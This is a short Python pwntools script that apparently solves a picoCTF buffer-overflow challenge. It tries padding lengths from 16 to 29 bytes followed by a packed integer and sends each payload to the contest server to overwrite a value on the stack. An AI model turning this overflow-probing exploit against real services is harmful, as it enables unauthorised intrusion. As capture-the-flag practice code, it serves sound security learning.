import struct, sys
from pwn import *

for i in range(16, 30):

    padding = b"A"*i
    # target_num = struct.pack("<I", 65)
    # payload = padding + target_num

    # sys.stdout.buffer.write(payload)
    target_num = p32(65)
    payload = padding + target_num

    io = remote("saturn.picoctf.net", 49866)

    io.sendlineafter(b"Enter a string: ", payload)
    # io.interactive()

    print(io.recvall().decode())
